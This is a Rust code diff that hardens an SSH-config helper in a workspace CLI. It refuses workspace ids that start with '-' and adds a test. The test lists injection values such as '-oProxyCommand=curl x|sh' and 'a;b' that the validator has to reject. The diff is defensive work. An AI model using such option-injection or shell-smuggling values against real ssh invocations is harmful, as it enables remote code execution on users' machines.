@@ -13,8 +13,12 @@ fn home() -> PathBuf {
 /// api refuses such a name (`model::valid_ws_name`), and this is the second half of the same
 /// rule: an object written before that check, or by any other path, is skipped rather than
 /// rendered. Duplicated rather than shared because the CLI depends on no server crate.
-fn safe_name(name: &str) -> bool {
+///
+/// A leading `-` is refused too: `kl ws ssh` puts the id into ssh's argv and into a
+/// shell-parsed `ProxyCommand`, where `-oProxyCommand=…` is an option, not a host.
+pub fn safe_name(name: &str) -> bool {
     !name.is_empty()
+        && !name.starts_with('-')
         && name.len() <= 63
         && name.bytes().all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b'-'))
 }
@@ -52,8 +56,7 @@ pub fn write(workspaces: &[crate::api::Workspace]) -> Result<PathBuf, String> {
     }
     b.create(&ssh).map_err(|e| e.to_string())?;
     let block = ssh.join("kloudlite_config");
-    std::fs::write(&block, render(workspaces, &crate::config::known_hosts()))
-        .map_err(|e| e.to_string())?;
+    crate::config::write_atomic(&block, &render(workspaces, &crate::config::known_hosts()))?;
 
     // ssh takes the FIRST value it sees for a keyword, so an Include appended after the user's own
     // `Host *` block would silently lose to it.
@@ -61,7 +64,7 @@ pub fn write(workspaces: &[crate::api::Workspace]) -> Result<PathBuf, String> {
     let include = format!("Include {}\n", block.display());
     let existing = std::fs::read_to_string(&cfg).unwrap_or_default();
     if !existing.contains(include.trim_end()) {
-        std::fs::write(&cfg, format!("{include}{existing}")).map_err(|e| e.to_string())?;
+        crate::config::write_atomic(&cfg, &format!("{include}{existing}"))?;
     }
     Ok(block)
 }
@@ -86,5 +89,15 @@ mod tests {
 
         let ok = super::render(&[ws("dev.1_a-b")], kh);
         assert!(ok.contains("Host dev.1_a-b\n"), "{ok}");
+    }
+
+    /// The id the api hands back goes into ssh's argv and a shell-parsed ProxyCommand, so an
+    /// option-shaped or shell-shaped value must be refused before either sees it.
+    #[test]
+    fn an_id_shaped_like_an_option_or_shell_is_refused() {
+        for bad in ["-oProxyCommand=curl x|sh", "-oStrictHostKeyChecking", "ws 1", "a;b", ""] {
+            assert!(!super::safe_name(bad), "{bad:?}");
+        }
+        assert!(super::safe_name("ws-1"));
     }
 }
